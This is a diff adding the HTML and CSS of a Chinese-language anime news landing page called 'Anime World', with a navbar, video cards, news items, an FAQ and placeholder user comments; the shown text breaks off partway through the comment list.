@@ -1,0 +1,1433 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anime World | 独家深度解析与热门动漫追踪平台</title>
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <meta name="robots" content="index,follow">
+    <meta name="bingbot" content="index,follow">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Anime World汇聚全网独家动漫内幕与热门追踪，为您带来深度解析、行业动态及精选视频内容，助您第一时间掌握核心资讯。">
+    <style>
+        :root {
+            --primary-color: #ff3366;
+            --primary-gradient: linear-gradient(135deg, #ff3366 0%, #ff6b8b 100%);
+            --bg-color: #0f1115;
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --text-main: #ffffff;
+            --text-secondary: #a0a0ab;
+            --text-muted: #71717a;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.8;
+            font-size: 16px;
+            overflow-x: hidden;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 70px;
+            background: rgba(15, 17, 21, 0.85);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 5%;
+            z-index: 1000;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            color: var(--text-main);
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .logo-wrapper {
+            position: relative;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-wrapper img {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            z-index: 2;
+        }
+
+        .sound-wave {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px solid var(--primary-color);
+            animation: wave 2s infinite;
+            opacity: 0;
+        }
+
+        @keyframes wave {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(1.6); opacity: 0; }
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 24px;
+            list-style: none;
+            align-items: center;
+        }
+
+        .nav-menu a {
+            text-decoration: none;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+            transition: color 0.3s;
+        }
+
+        .nav-menu a:hover {
+            color: var(--primary-color);
+        }
+
+        .nav-search {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid var(--border-color);
+            padding: 6px 14px;
+            border-radius: 20px;
+            color: var(--text-main);
+            outline: none;
+        }
+
+        .scroll-progress {
+            position: fixed;
+            top: 70px;
+            left: 0;
+            height: 3px;
+            background: var(--primary-gradient);
+            width: 0%;
+            z-index: 999;
+            transition: width 0.1s;
+        }
+
+        .hero-banner {
+            margin-top: 70px;
+            height: 45vh;
+            background: linear-gradient(180deg, #1a1528 0%, var(--bg-color) 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 0 20px;
+            position: relative;
+        }
+
+        .hero-banner h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            background: linear-gradient(to right, #ffffff, #ff8da1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-banner .slogan {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+
+        .hero-banner .desc {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            max-width: 600px;
+            margin-bottom: 24px;
+        }
+
+        .hero-cta {
+            display: flex;
+            gap: 16px;
+        }
+
+        .btn {
+            padding: 10px 24px;
+            border-radius: 30px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+
+        .section {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 80px 20px;
+        }
+
+        .section-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .section-header h2 {
+            font-size: 2rem;
+            margin-bottom: 12px;
+        }
+
+        .section-header p {
+            color: var(--text-secondary);
+        }
+
+        .advantage-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+
+        .advantage-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 32px 24px;
+            border-radius: 70px;
+            text-align: center;
+            transition: transform 0.3s, border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .advantage-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--primary-color);
+            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.1);
+        }
+
+        .advantage-icon {
+            font-size: 2.5rem;
+            margin-bottom: 16px;
+        }
+
+        .advantage-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 12px;
+            color: var(--text-main);
+        }
+
+        .advantage-card p {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .intro-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 48px;
+            text-align: center;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+
+        .intro-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--primary-color);
+        }
+
+        .intro-tags {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+        }
+
+        .tag-pill {
+            background: rgba(255, 51, 102, 0.1);
+            color: var(--primary-color);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .intro-text-group {
+            color: var(--text-secondary);
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+
+        .video-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            overflow: hidden;
+            transition: transform 0.3s, border-color 0.3s;
+        }
+
+        .video-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--primary-color);
+        }
+
+        .video-thumbnail {
+            height: 180px;
+            position: relative;
+            background: linear-gradient(135deg, #2b233d, #1a1528);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-thumbnail-top {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            background: rgba(0,0,0,0.5);
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+        }
+
+        .play-btn {
+            width: 48px;
+            height: 48px;
+            background: rgba(255, 51, 102, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.2rem;
+        }
+
+        .video-duration {
+            position: absolute;
+            bottom: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.7);
+            padding: 2px 8px;
+            border-radius: 8px;
+            font-size: 0.75rem;
+        }
+
+        .video-info {
+            padding: 20px;
+        }
+
+        .video-title {
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .video-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 16px;
+            height: 3.2em;
+        }
+
+        .video-meta {
+            display: flex;
+            justify-content: space-between;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 12px;
+        }
+
+        .video-tags-group {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .tag-video {
+            background: var(--primary-color);
+            color: white;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+        }
+
+        .tag {
+            background: rgba(255,255,255,0.08);
+            color: var(--text-secondary);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+            grid-auto-rows: 1fr;
+        }
+
+        .news-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            min-height: 220px;
+            transition: transform 0.3s, border-color 0.3s;
+            cursor: pointer;
+        }
+
+        .news-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--primary-color);
+        }
+
+        .news-date {
+            color: var(--primary-color);
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .news-title {
+            font-size: 1.05rem;
+            font-weight: bold;
+            margin-bottom: 12px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            height: 2.8em;
+        }
+
+        .news-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .news-footer {
+            margin-top: auto;
+            color: var(--primary-color);
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        .news-divider {
+            width: 40px;
+            height: 3px;
+            background: var(--primary-color);
+            margin: 12px auto 40px auto;
+            border-radius: 2px;
+        }
+
+        .news-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+
+        .news-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .news-modal__dialog {
+            background: #161922;
+            border: 1px solid var(--border-color);
+            width: 90%;
+            max-width: 720px;
+            max-height: 80vh;
+            border-radius: 24px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            transform: scale(0.95);
+            transition: transform 0.3s;
+        }
+
+        .news-modal.active .news-modal__dialog {
+            transform: scale(1);
+        }
+
+        .news-modal__header {
+            padding: 24px;
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .news-modal__header h3 {
+            font-size: 1.3rem;
+            margin-bottom: 8px;
+            padding-right: 30px;
+        }
+
+        .news-modal__close {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.5rem;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .news-modal__close:hover {
+            color: var(--primary-color);
+        }
+
+        .news-modal__body {
+            padding: 24px;
+            overflow-y: auto;
+            color: var(--text-secondary);
+            font-size: 1rem;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .faq-list {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .faq-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 24px;
+            cursor: pointer;
+            transition: border-color 0.3s, transform 0.3s;
+        }
+
+        .faq-card:hover {
+            border-color: var(--primary-color);
+            transform: translateY(-2px);
+        }
+
+        .faq-question {
+            font-size: 1.05rem;
+            font-weight: 600;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .faq-answer {
+            color: var(--text-secondary);
+            margin-top: 12px;
+            display: none;
+            font-size: 0.95rem;
+            padding-top: 12px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .faq-card.active .faq-answer {
+            display: block;
+        }
+
+        .guide-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+        }
+
+        .guide-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 28px 20px;
+            text-align: center;
+        }
+
+        .guide-icon {
+            font-size: 2rem;
+            margin-bottom: 12px;
+        }
+
+        .guide-step {
+            font-size: 0.85rem;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .guide-title {
+            font-size: 1.05rem;
+            margin-bottom: 10px;
+        }
+
+        .guide-desc {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .comment-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 24px;
+            padding: 40px;
+        }
+
+        .comment-form {
+            background: rgba(0,0,0,0.2);
+            padding: 24px;
+            border-radius: 16px;
+            margin-bottom: 30px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .comment-input, .comment-textarea {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border-color);
+            padding: 12px 16px;
+            border-radius: 12px;
+            color: var(--text-main);
+            outline: none;
+            width: 100%;
+        }
+
+        .comment-textarea {
+            height: 100px;
+            resize: none;
+        }
+
+        .comment-list {
+            max-height: 600px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            padding-right: 8px;
+        }
+
+        .comment-item {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .comment-user-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+
+        .comment-user-name {
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .comment-tags {
+            display: flex;
+            gap: 8px;
+        }
+
+        .comment-tag {
+            background: rgba(255, 51, 102, 0.1);
+            color: var(--primary-color);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+        }
+
+        .comment-content {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .comment-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 900px) {
+            .advantage-grid, .video-grid, .news-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .guide-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .nav-menu {
+                display: none;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .advantage-grid, .video-grid, .news-grid, .guide-grid {
+                grid-template-columns: 1fr;
+            }
+            .hero-banner h1 {
+                font-size: 2rem;
+            }
+            .comment-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <video autoplay loop muted playsinline style="position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -2; object-fit: cover; filter: brightness(0.65);">
+    <source src="270408_medium.mp4" type="video/mp4">
+</video>
+
+    <video autoplay loop muted playsinline preload="metadata" style="position: fixed; right: 0; bottom: 0; min-width: 100%; min-height: 100%; z-index: -2; object-fit: cover; filter:       brightness(0.65);">
+    <source src="270408_medium.mp4" type="video/mp4">
+    </video>
+    <nav class="navbar">
+        <a href="#" class="nav-brand">
+            <div class="logo-wrapper">
+                <div class="sound-wave"></div>
+                <img src="nezuko.jpg" alt="Anime World">
+            </div>
+            <span>Anime World</span>
+        </a>
+        <ul class="nav-menu">
+            <li><a href="#section-advantage">核心优势</a></li>
+            <li><a href="#section-video">精选视频</a></li>
+            <li><a href="#section-intro">平台简介</a></li>
+            <li><a href="#section-news">相关资讯</a></li>
+            <li><a href="#section-faq">常见问题</a></li>
+            <li><a href="#section-comment">留言评论</a></li>
+        </ul>
+        <input type="text" class="nav-search" placeholder="搜索动漫内容...">
+    </nav>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="hero-banner">
+        <h1>解锁 Anime World 的幕后秘辛与核心时刻</h1>
+        <p class="slogan">深度追踪行业第一手独家内幕与热门动漫争议</p>
+        <p class="desc">从全网热议到深度解密，我们拆解事件真相、挖掘冷知识，带您真正看清每一个热点背后的故事。</p>
+        <div class="hero-cta">
+            <a href="#section-video" class="btn btn-primary">立即探索</a>
+            <a href="#section-news" class="btn" style="background: rgba(255,255,255,0.08); color: white;">查看资讯</a>
+        </div>
+    </header>
+
+    <section class="section" id="section-advantage">
+        <div class="section-header">
+            <h2>为什么选择 Anime World</h2>
+            <p>专业解析 × 全网追踪 × 极速体验，带您深度客观观察</p>
+        </div>
+        <div class="advantage-grid">
+            <div class="advantage-card">
+                <div class="advantage-icon">⚡</div>
+                <h3>极速实时更新</h3>
+                <p>全网全天候监控海量动态，确保您第一时间获取最新鲜的一手资讯。</p>
+            </div>
+            <div class="advantage-card">
+                <div class="advantage-icon">🔍</div>
+                <h3>深度独家复盘</h3>
+                <p>拒绝流于表面，多维度交叉比对，为您还原事件背后的完整逻辑脉络。</p>
+            </div>
+            <div class="advantage-card">
+                <div class="advantage-icon">🛡️</div>
+                <h3>隐私安全保障</h3>
+                <p>采用先进数据加密与匿名保护机制，提供舒适且安心的浏览体验。</p>
+            </div>
+            <div class="advantage-card">
+                <div class="advantage-icon">🌐</div>
+                <h3>多端无缝适配</h3>
+                <p>完美支持电脑,平板与智能手机,随时随地享受流畅的高清阅读。</p>
+            </div>
+            <div class="advantage-card">
+                <div class="advantage-icon">🎯</div>
+                <h3>智能精准推荐</h3>
+                <p>依托个性化算法模型,精准匹配您最感兴趣的垂直领域与热门话题。</p>
+            </div>
+            <div class="advantage-card">
+                <div class="advantage-icon">💬</div>
+                <h3>活跃理性社区</h3>
+                <p>汇聚各路硬核动漫迷,畅所欲言、理性讨论,碰撞出精彩的观点火花。</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="section-video">
+        <div class="section-header">
+            <h2>热门精选视频内容</h2>
+            <p>精选全网高热度可视化解析,直观呈现事件全貌</p>
+        </div>
+       <div class="video-card">
+                <div class="video-thumbnail">
+                    <!-- THÊM DÒNG ẢNH NÀY VÀO ĐÂY -->
+                    <img src="anhanime.jpg" alt="Anime" style="width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0;">
+                    <div class="video-thumbnail-top">🔥 独家解析</div>
+                    <div class="play-btn">▶</div>
+                    <div class="video-duration">12:45</div>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title">近期全网热议动漫深度复盘与核心逻辑拆解</h3>
+                    <div class="video-desc">本期视频带您全方位回顾近期各大社群刷屏的焦点事件,从引起到发酵进行全景式复盘。</div>
+                    <div class="video-meta">
+                        <span>播放: 3.4w</span>
+                        <span>点赞: 1.5w</span>
+                    </div>
+                    <div class="video-tags-group">
+                        <span class="tag-video">热点追踪</span>
+                        <span class="tag">深度复盘</span>
+                    </div>
+                </div>
+            </div>
+            <div class="video-card">
+                <div class="video-thumbnail" style="position: relative; overflow: hidden;">
+                    <img src="anhanime.jpg" alt="Anime" style="width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0;">
+                    <div class="video-thumbnail-top" style="position: relative; z-index: 2;">🔥 Tập 01</div>
+                    <div class="video-duration" style="position: relative; z-index: 2;">12:45</div>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title">Tập 01: Khởi đầu hành trình Anime</h3>
+                    <div class="video-desc">Giao diện hiển thị hình ảnh tĩnh sắc nét cho trang web Anime World.</div>
+                    <div class="video-meta">
+                        <span>Lượt xem: 3.4k</span>
+                        <span>Yêu thích: 1.5k</span>
+                    </div>
+                </div>
+            </div>
+            <div class="video-card">
+                <div class="video-thumbnail">
+                    <div class="video-thumbnail-top">📊 行业观察</div>
+                    <div class="play-btn">▶</div>
+                    <div class="video-duration">15:10</div>
+                </div>
+                <div class="video-info">
+                    <h3 class="video-title">从流量狂欢到理性回归：内容生态的演变之路</h3>
+                    <div class="video-desc">深度剖析当代网络热点背后的商业推手与大众心理变化,带你看懂现象之下的本质。</div>
+                    <div class="video-meta">
+                        <span>播放: 4.8w</span>
+                        <span>点赞: 2.2w</span>
+                    </div>
+                    <div class="video-tags-group">
+                        <span class="tag-video">行业观察</span>
+                        <span class="tag">深度思考</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="section-intro">
+        <div class="section-header">
+            <h2>关于 Anime World 平台</h2>
+        </div>
+        <div class="intro-card">
+            <div class="intro-tags">
+                <span class="tag-pill">客观公正</span>
+                <span class="tag-pill">前沿追踪</span>
+                <span class="tag-pill">深度干货</span>
+            </div>
+            <div class="intro-text-group">
+                <p>Anime World是面向广大互联网用户的专业资讯与热点追踪平台。我们致力于打破信息不对称,汇聚全网最新、最全、最具价值的讨论热点与行业动态。在这里,您可以轻松获取多维度的深度解析、独家复盘以及客观理性的观点碰撞。</p>
+                <p>无论您是希望第一时间追踪全网动漫动态,还是寻找有深度、有逻辑的硬核事件剖析,Anime World都将为您提供优质、高效且安全的浏览体验,陪伴您看清每一个热点背后的真实世界。</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="section-news">
+        <div class="section-header">
+            <h2>相关资讯</h2>
+            <p>洞察行业前沿,掌握最新动态</p>
+            <div class="news-divider"></div>
+        </div>
+        <div class="news-grid">
+            <div class="news-card" onclick="openModal('news1')">
+                <div class="news-date">2026-11-08</div>
+                <h3 class="news-title">近期网络舆论场新变化：理性追番成为主流声音</h3>
+                <div class="news-desc">随着大众媒介素养的提升,网民在面对突发热点时正从盲目跟风转向独立思考与理性求证。</div>
+                <div class="news-footer">查看详情 →</div>
+            </div>
+            <div class="news-card" onclick="openModal('news2')">
+                <div class="news-date">2026-10-25</div>
+                <h3 class="news-title">如何在大数据时代保持清醒：信息筛选与鉴别方法论</h3>
+                <div class="news-desc">面对海量碎片的娱乐与社会资讯,掌握科学的信息过滤与交叉验证技能变得尤为重要。</div>
+                <div class="news-footer">查看详情 →</div>
+            </div>
+            <div class="news-card" onclick="openModal('news3')">
+                <div class="news-date">2026-10-12</div>
+                <h3 class="news-title">深度解析跨平台传播机制：一个热点是如何引爆全网的</h3>
+                <div class="news-desc">从首发爆料到跨圈层扩散,现代热点事件的传播路径呈现出哪些规律与演变特征?</div>
+                <div class="news-footer">查看详情 →</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="section-faq">
+        <div class="section-header">
+            <h2>常见问题解答</h2>
+            <p>为您解答关于平台使用与内容机制的常见疑问</p>
+        </div>
+        <div class="faq-list">
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 Anime World平台上的资讯内容多久更新一次？</div>
+                <div class="faq-answer">本平台采用全天候实时监控与自动化流转机制,热门话题与独家内幕会根据事件发酵进度保持高频更新,确保用户随时随地都能获取到最新鲜的动态。</div>
+            </div>
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 如何在平台参与留言评论与观点讨论？</div>
+                <div class="faq-answer">您只需前往页面下方的“留言评论”专区,输入您的专属昵称与想要表达的观点内容,点击发布即可实时同步至历史评论滚动列表中,与全国网友共同探讨。</div>
+            </div>
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 平台发布的内容是否支持多端自适应访问？</div>
+                <div class="faq-answer">是的,Anime World全面采用了响应式布局设计,无论您使用电脑端、平板电脑还是各类智能手机,均可获得流畅、清晰且美观的排版阅读体验。</div>
+            </div>
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 如何保证平台所展示资讯内容的客观与真实性？</div>
+                <div class="faq-answer">我们拥有严谨的内容筛选与交叉比对机制,致力于剔除虚假夸大信息,通过多维度复盘与多方信源核对,确保呈现给用户的每一条解析都具备参考价值。</div>
+            </div>
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 浏览平台内容是否需要注册或支付额外费用？</div>
+                <div class="faq-answer">不需要。Anime World致力于为广大用户提供开放、便捷的优质资讯浏览服务,所有基础文章与视频内容均可直接免费查看。</div>
+            </div>
+            <div class="faq-card" onclick="toggleFaq(this)">
+                <div class="faq-question">📌 如果发现内容有误或有好的建议如何反馈？</div>
+                <div class="faq-answer">如果您在浏览过程中发现任何内容瑕疵或有宝贵的改进建议,欢迎随时通过留言区与我们联系,我们将积极采纳并不断优化平台服务质量。</div>
+            </div>
+        </div>
+    </section>
+
+    <section class="section">
+        <div class="section-header">
+            <h2>使用指南</h2>
+            <p>四步轻松玩转本平台,畅享极致浏览体验</p>
+        </div>
+        <div class="guide-grid">
+            <div class="guide-card">
+                <div class="guide-icon">🔍</div>
+                <div class="guide-step">STEP 01</div>
+                <h3 class="guide-title">搜索与筛选</h3>
+                <p class="guide-desc">利用顶部搜索栏或分类标签,快速定位您感兴趣的垂直热点话题。</p>
+            </div>
+            <div class="guide-card">
+                <div class="guide-icon">📺</div>
+                <div class="guide-step">STEP 02</div>
+                <h3 class="guide-title">深度阅读</h3>
+                <p class="guide-desc">点击精选卡片或资讯详情,获取多维度的硬核复盘与全景解析。</p>
+            </div>
+            <div class="guide-card">
+                <div class="guide-icon">💬</div>
+                <div class="guide-step">STEP 03</div>
+                <h3 class="guide-title">互动讨论</h3>
+                <p class="guide-desc">在评论区发表您的独特见解,参与全网网友的理性观点碰撞。</p>
+            </div>
+            <div class="guide-card">
+                <div class="guide-icon">⭐</div>
+                <div class="guide-step">STEP 04</div>
+                <h3 class="guide-title">持续追踪</h3>
+                <p class="guide-desc">收藏本站并保持关注,第一时间掌握事件后续发展的最新动态。</p>
+            </div>
+        </div>
+    </section>
+
+    <section class="section" id="section-comment">
+        <div class="section-header">
+            <h2>用户留言与讨论</h2>
+            <p>畅所欲言,理性探讨,分享您的真实观点</p>
+        </div>
+        <div class="comment-container">
+            <div class="comment-form">
+                <input type="text" class="comment-input" placeholder="输入您的专属昵称...">
+                <textarea class="comment-textarea" placeholder="分享您的真知灼见或讨论剧情进展..."></textarea>
+                <button class="btn btn-primary" style="align-self: flex-start; display: flex; align-items: center; gap: 8px;">
+                    <span>↑ 发布留言</span>
+                </button>
+            </div>
+            <div class="comment-list">
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">追光者_阿杰</span>
+                        <span>2小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">好评</span>
+                        <span class="comment-tag">观点</span>
+                    </div>
+                    <div class="comment-content">这波深度复盘是真的到位,把来龙去脉梳理得清清楚楚,比到处看碎片化消息强太多了！</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 428 · 💬 6</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">深夜追番群众</span>
+                        <span>4小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">热门</span>
+                        <span class="comment-tag">讨论</span>
+                    </div>
+                    <div class="comment-content">确实没想到后续发展会这么反转,幸好有这里的专业梳理,不然差点被带偏节奏。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 352 · 💬 12</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">硬核观察员</span>
+                        <span>6小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">理性</span>
+                        <span class="comment-tag">热议</span>
+                    </div>
+                    <div class="comment-content">从传播学的角度来看,这个事件的爆发路径确实很有研究价值,期待后续的深度追踪。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 291 · 💬 3</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">星河灿烂时</span>
+                        <span>9小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">催更</span>
+                        <span class="comment-tag">精彩</span>
+                    </div>
+                    <div class="comment-content">分析得太精彩了！希望能快点出第二期视频,完全不够看呀！</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 185 · 💬 1</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">理智的小方</span>
+                        <span>12小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">理性</span>
+                        <span class="comment-tag">好评</span>
+                    </div>
+                    <div class="comment-content">现在网上的声音太杂了,难得这里能保持客观中立的立场,给小编点个赞！</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 512 · 💬 8</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">风中凌乱的猫</span>
+                        <span>14小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">讨论</span>
+                        <span class="comment-tag">观点</span>
+                    </div>
+                    <div class="comment-content">看完文章突然觉得很多事情不能只看表面,多维度的交叉比对太重要了。</div>
+                    <div class="comment-footer">
+                        <span>回复</span>
+                        <span>👍 94 · 💬 2</span>
+                    </div>
+                </div>
+                <div class="comment-item">
+                    <div class="comment-user-info">
+                        <span class="comment-user-name">代码写到天亮</span>
+                        <span>17小时前</span>
+                    </div>
+                    <div class="comment-tags">
+                        <span class="comment-tag">热门</span>
+                        <span class="comment-tag">热议</span>
+                    </div>
